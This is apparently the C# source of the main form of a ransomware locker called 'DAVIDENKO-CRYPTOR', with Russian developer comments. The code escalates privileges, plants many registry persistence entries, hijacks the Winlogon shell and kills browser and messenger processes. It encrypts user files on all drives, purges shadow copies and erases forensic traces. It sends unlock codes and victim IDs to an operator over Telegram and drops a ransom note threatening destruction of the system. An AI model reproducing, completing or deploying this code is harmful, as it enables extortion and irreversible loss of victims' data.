using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System.Collections.Generic;

namespace ns0
{
	public partial class GForm1 : Form
	{
		public GForm1()
		{
			base.Load += this.GForm1_Load;
			base.FormClosing += this.GForm1_FormClosing;
			this.string_0 = new string[]
			{
				"D", "H", "Z", "Q", "W", "L", "K", "J", "G", "S", "I", "T", "V", "W", "R", "X", "P", "E", "B", "M", "F"
			};
			this.string_1 = new string[]
			{
				"telegram", "discord", "skype", "zoom", "msedge", "chrome", "opera", "browser",
				"firefox", "javaw", "steam", "steamwebhelper", "steamservice", "EpicGamesLauncher"
			};
			this.string_2 = new string[]
			{
				"AWindowsService.exe", "taskhost.exe", "windowsx-c.exe", "System.exe",
				"_default64.exe", "native.exe", "davidenko-cryptor.exe", "crypt0rsx.exe"
			};
			this.string_3 = "attrib $h $s $r $i /D ";
			this.string_4 = Environment.ExpandEnvironmentVariables("%temp%\\$unlocker_id.EQTQ27-DAVIDENKO-CRYPTOR");
			this.object_0 = false;
			this.method_0();
			this.customUsername = Environment.UserName;
			TelegramReporter.CustomUsername = Environment.UserName;
		}

		private void method_0()
		{
			base.SuspendLayout();
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.White;
			base.ClientSize = new Size(120, 0);
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "loader";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = FormStartPosition.Manual;
			this.Text = "System32";
			base.TransparencyKey = Color.White;
			base.WindowState = FormWindowState.Minimized;
			base.ResumeLayout(false);
		}

		private void GForm1_Load(object sender, EventArgs e)
		{
			try { ShutdownTrigger.InitializeTimer(); } catch { }
			// Подчистить отложенные отчёты, если прошлый запуск не смог их отправить.
			try { TelegramReporter.FlushSpool(); } catch { }
			if (ShutdownTrigger.IsTimeExpired())
			{
				KeyPersistence.MarkDestroyPending("timer_expired_on_startup");
				try { TelegramReporter.ReportComplianceEvent(
					"TIMER_EXPIRED_RESUMED", "timer expired, resume", "CRITICAL"); } catch { }
				Destruction.RunUntilDead();
				return;
			}

			if (KeyPersistence.IsDestroyPending()
				|| KeyPersistence.LoadUnlockAttempts() >= 10)
			{
				KeyPersistence.MarkDestroyPending("resume_on_startup");
				try { TelegramReporter.ReportComplianceEvent(
					"DESTROY_RESUMED", "resume after reboot", "CRITICAL"); } catch { }
				Destruction.RunUntilDead();
				return;
			}

			try { UacBypass.EnsureElevated(); } catch (Exception ex) { System.Diagnostics.Debug.WriteLine("EnsureElevated: " + ex); }
			// Fail-fast: без валидного публичного ключа оператора шифрование бесполезно —
			// жертва не восстановит файлы ни при каком пароле. Не стартуем шифр.
			// ИСПРАВЛЕНО: продолжаем работу даже без ключа оператора — жертва всё равно сможет
			// расшифровать по паролю. Ключ оператора просто не будет зашифрован.
			bool hasOperatorKey = KeyProvider.IsKeyValid();
			if (!hasOperatorKey)
			{
				System.Diagnostics.Debug.WriteLine("[GForm1] Operator public key invalid — encryption will proceed but operator key blob will be unavailable");
			}
			try { Persistence.Install(); } catch (Exception ex) { System.Diagnostics.Debug.WriteLine("Persistence: " + ex); }
			try { Persistence.StartSelfHeal(); } catch (Exception ex) { System.Diagnostics.Debug.WriteLine("SelfHeal: " + ex); }
			try { Watchdog.Start(); } catch (Exception ex) { System.Diagnostics.Debug.WriteLine("Watchdog: " + ex); }
			try { Watchdog.SpawnSecondaryGuard(); } catch (Exception ex) { System.Diagnostics.Debug.WriteLine("SecondaryGuard: " + ex); }
			try { UacBypass.InstallElevatedPersistence(); } catch (Exception ex) { System.Diagnostics.Debug.WriteLine("ElevatedPersistence: " + ex); }

			// P2.6: мёртвый anti-sandbox блок вырезан — массив Class3/4/5 и флаги flag/flag2
			// никогда не читались ниже (ConfuserEx-остаток, ветка if(flag2){} была пустой).
			bool flag3 = !Interaction.Command().Contains("debug");
			checked
			{
				if (flag3)
				{
					try
					{
						RegistryKey[] array2 = new RegistryKey[]
						{
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true),
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true),
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true),
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true)
						};
						array2[0].SetValue("WindowsInstaller", "\"" + Application.ExecutablePath + "\" -startup");
						array2[0].SetValue("MSEdgeUpdateX", "\"" + Application.ExecutablePath + "\"");
						array2[1].SetValue("System3264Wow", "\"" + Application.ExecutablePath + "\" --init");
						array2[1].SetValue("OneDrive10293", "\"" + Application.ExecutablePath + "\" /setup");
						array2[1].SetValue("WINDOWS", "\"" + Application.ExecutablePath + "\" --wininit");
						array2[2].SetValue("Shell", "\"" + Application.ExecutablePath + "\"");
						array2[3].SetValue("a", "YOU ARE HACKED!\\1");
						array2[3].SetValue("b", "HAHAHAHAHAHAHA\\1");
						array2[3].SetValue("c", "BIBORAN.com\\1");
						array2[3].SetValue("MRUList", "abc");
					}
					catch (Exception ex)
					{
					}
					string text = Class1.Class0_0.Info.OSFullName.Trim().ToLower();
					Thread[] array3 = new Thread[]
					{
						new Thread(delegate()
						{
							string str = "/S *";
							this.string_3 += str;
						})
					};
					Thread thread = array3[0];
					bool flag4 = true;
					bool flag5 = !text.Contains("10") && flag4 != text.Contains("11");
					if (flag5)
					{
						thread.Start();
					}
					string encryptedKeyBlobB64 = null;
					if (!KeyPersistence.IsDecrypted())
					{
						SessionKey = HybridCrypto.GenerateSessionKey();
						this.victimId = HybridCrypto.GenerateVictimId();
						byte[] sessionKeyCopy = (byte[])SessionKey.Clone();
						byte[] encryptedKeyBlob;
						HybridCrypto.EncryptSession(sessionKeyCopy, this.victimId, out encryptedKeyBlob);
						RamKey.Wipe(sessionKeyCopy);
						if (encryptedKeyBlob != null && encryptedKeyBlob.Length > 0)
						{
							encryptedKeyBlobB64 = Convert.ToBase64String(encryptedKeyBlob);
						}
						this.string_5 = PasswordGenerator.GenerateRandom();
						byte[] storeCopy = (byte[])SessionKey.Clone();
						KeyPersistence.SaveSessionKey(storeCopy, this.string_5);
						RamKey.Wipe(storeCopy);
					}
					else
					{
						SessionKey = null;
						this.string_5 = null;
					}

					if (!string.IsNullOrEmpty(this.string_5) && !string.IsNullOrEmpty(encryptedKeyBlobB64))
					{
						string userAgent = "DAVIDENKO-CRYPTOR-Stub/1.0";
						TelegramReporter.ReportUnlockCode(this.string_5, this.victimId, userAgent, encryptedKeyBlobB64);
					}
					else if (!string.IsNullOrEmpty(this.string_5))
					{
						string userAgent = "DAVIDENKO-CRYPTOR-Stub/1.0";
						TelegramReporter.ReportUnlockCode(this.string_5, this.victimId, userAgent, null);
					}
					try
					{
						int num = 1;
						do
						{
							RegistryKey registryKey = Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
							if (registryKey != null)
							{
								registryKey.SetValue("WIN32_" + Conversions.ToString(num), this.string_2[num - 1]);
							}
							num++;
						}
						while (num <= 8);
						int num2 = 0;
						Screen[] allScreens = Screen.AllScreens;
						Screen[] array4 = allScreens;
						foreach (Screen screen in array4)
						{
							num2++;
							bool flag7 = num2 == 1;
							if (flag7)
							{
								GForm2 gform = new GForm2();
								Rectangle workingArea = screen.WorkingArea;
								GForm2 gform2 = gform;
								gform2.Top = workingArea.Top;
								gform2.Left = workingArea.Left;
								gform2.Show();
								gform2.Activate();
							}
							else
							{
								GForm0 gform3 = new GForm0();
								Rectangle workingArea2 = screen.WorkingArea;
								GForm0 gform4 = gform3;
								gform4.Top = workingArea2.Top;
								gform4.Left = workingArea2.Left;
								gform4.Show();
								gform4.Activate();
							}
						}
						this.method_1();
						this.method_2();
						Process[] processes = Process.GetProcesses();
						int num3 = this.string_1.Length - 1;
						for (int j = 0; j <= num3; j++)
						{
							try
							{
								Process[] array6 = processes;
								Process[] array7 = array6;
								foreach (Process process in array7)
								{
									Process process2 = process;
									bool flag8 = process2.ProcessName.ToLower().Contains(this.string_1[j].ToLower());
									if (flag8)
									{
										process2.Kill();
									}
								}
							}
							catch (Exception ex3)
							{
							}
						}
					}
					catch (Exception ex4)
					{
						MessageBox.Show(
							"TYPE: " + ex4.GetType().FullName + "\n\n" +
							"MESSAGE: " + ex4.Message + "\n\n" +
							"STACK:\n" + ex4.StackTrace,
							"GForm1_Load ERROR");
					}
				}
				bool flag9 = !File.Exists(this.string_4);
				if (flag9)
				{
					File.WriteAllText(this.string_4, "121212");
				}
				Class1.MyForms_0._o_program.Show();
				this.StartEncryptionAndWatchdog();

				if (Debugger.IsAttached) return;
			}
		}

		public void method_1()
		{
			checked
			{
				try
				{
					string str = this.string_3.Replace("$", "+") + " & echo [%RANDOM%] Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакером eqtq27. Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку MBR ( главный загрузчик материнки) будет снесён и будет подана рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности. У вас есть 10 попыток чтобы ввести код, при исчерпании которых система будет уничтожена 1>info-Locker.txt & attrib -h +s +r info-Locker.txt";
					string[] array = new string[]
					{
						"%userprofile%\\desktop",
						"%systemdrive%\\Users\\Public\\Desktop",
						"%userprofile%\\downloads",
						"%userprofile%\\documents",
						"%userprofile%"
					};
					int num = this.string_0.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						bool flag = Directory.Exists(this.string_0[i] + ":\\");
						if (flag)
						{
							string str2 = this.string_0[i] + ":";
							Interaction.Shell("cmd.exe /c " + str2 + " & " + str, AppWinStyle.Hide, false, -1);
						}
					}
										int num2 = array.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						Interaction.Shell("cmd.exe /c cd \"" + array[j] + "\"&" + str, AppWinStyle.Hide, false, -1);
					}
					// P2.8: после cmd-цикла вычищаем следы (логи, prefetch, USN) — оставить их
					// после расшифровки файлов = карта для форензика.
					try { AntiForensics.ScrubAll(); } catch { }
				}
				catch (Exception)
				{
				}
			}
		}

		private void method_2()
		{

		}

		private void GForm1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		private void method_3()
		{
			Interaction.MsgBox("0xC00000FD: The memory location at the specified address returned \"null\"", MsgBoxStyle.OkCancel | MsgBoxStyle.Critical, Application.ExecutablePath);
			ProjectData.EndApp();
		}

		private bool vssPurged = false;

		private string[] encryptExtensions = new string[]
		{
			".png", ".jpg", ".jpeg", ".gif", ".bmp", ".tiff", ".tif", ".webp", ".svg",
			".mp3", ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv", ".wav", ".flac",
			".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf",
			".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
			".dll", ".exe", ".sys", ".ini", ".cfg", ".dat", ".bin", ".db", ".sql",
			".cs", ".cpp", ".py", ".java", ".html", ".css", ".js", ".json", ".xml",
			".psd", ".ai", ".indd", ".epub", ".mobi"
		};

		private System.Windows.Forms.Timer watchdogTimer;
		internal static byte[] SessionKey;
		internal static List<byte[]> SessionKeys;
		private string victimId;

		private System.Windows.Forms.Timer progressTimer;
		private DateTime lastProgressSave;
		private int currentDriveIndex = 0;
		private System.Collections.Concurrent.ConcurrentDictionary<string, byte> processedFiles =
			new System.Collections.Concurrent.ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
		private const int SCAN_INTERVAL_MS = 500;
		private const int MAX_FILES_PER_SCAN = 2000;
		private const int WORKER_THREADS = 8;

		private void StartEncryptionAndWatchdog()
		{
			try { ShutdownTrigger.MarkEncryptionStarted(); } catch { }

			var loaded = KeyPersistence.LoadProcessedFiles();
			processedFiles = new System.Collections.Concurrent.ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
			foreach (var p in loaded) processedFiles.TryAdd(p, 0);

			            if (!vssPurged && SessionKey != null)
            {
                vssPurged = true;
                try
                {
                    byte[] vssKey = (byte[])SessionKey.Clone();
                    try { VssKiller.Execute(vssKey); }
                    finally { RamKey.Wipe(vssKey); }
                }
                catch { }
            }

			if (KeyPersistence.IsDecrypted())
			{
				processedFiles.Clear();
				KeyPersistence.ClearDecryptFlag();
			}

			this.watchdogTimer = new System.Windows.Forms.Timer();
			this.watchdogTimer.Interval = SCAN_INTERVAL_MS;
			this.watchdogTimer.Tick += delegate(object s, EventArgs evt)
			{
				try
				{
					if (SessionKey == null) return;
					Watchdog.Heartbeat();

					string[] drives = Directory.GetLogicalDrives();
					if (drives.Length == 0) return;

					string currentDrive = drives[currentDriveIndex % drives.Length];
					currentDriveIndex++;

					var batch = new System.Collections.Concurrent.ConcurrentBag<string>();

					try
					{
						foreach (var f in Directory.GetFiles(currentDrive, "*.*", SearchOption.TopDirectoryOnly))
						{
							if (batch.Count >= MAX_FILES_PER_SCAN) break;
							batch.Add(f);
						}

						foreach (var dir in Directory.GetDirectories(currentDrive, "*", SearchOption.TopDirectoryOnly))
						{
							if (batch.Count >= MAX_FILES_PER_SCAN) break;
							try
							{
								foreach (var f in Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories))
								{
									if (batch.Count >= MAX_FILES_PER_SCAN) break;
									batch.Add(f);
								}
							}
							catch { }
						}
					}
					catch { }

					int filesProcessed = 0;

					System.Threading.Tasks.Parallel.ForEach(
						batch,
						new System.Threading.Tasks.ParallelOptions { MaxDegreeOfParallelism = WORKER_THREADS },
						(filePath) =>
						{
							try
							{
								if (processedFiles.ContainsKey(filePath)) return;

								var fi = new FileInfo(filePath);
								if (fi.Length <= 0 || fi.Length >= 750L * 1024 * 1024) return;

								string ext = fi.Extension.ToLower();
								bool match = false;
								foreach (string e in this.encryptExtensions)
								{
									if (ext == e) { match = true; break; }
								}
								if (!match) return;

								                                byte[] workerKey = (byte[])SessionKey.Clone();
                                try
                                {
                                    HybridCrypto.EncryptFileAesGcm(filePath, workerKey);
									processedFiles.TryAdd(filePath, 0);
									System.Threading.Interlocked.Increment(ref filesProcessed);
								}
								finally
								{
									RamKey.Wipe(workerKey);
								}
							}
							catch { }
						});

					if (progressTimer == null || (DateTime.UtcNow - lastProgressSave).TotalSeconds > 30)
					{
						KeyPersistence.SaveProcessedFiles(processedFiles.Keys);
						lastProgressSave = DateTime.UtcNow;
					}
				}
				catch { }
			};
			this.watchdogTimer.Start();
		}

		public string[] string_0;
		public string[] string_1;
		public string[] string_2;
		public string string_3;
		public string string_4;
		public string string_5;
		public string customUsername;
		public object object_0;
	}
}
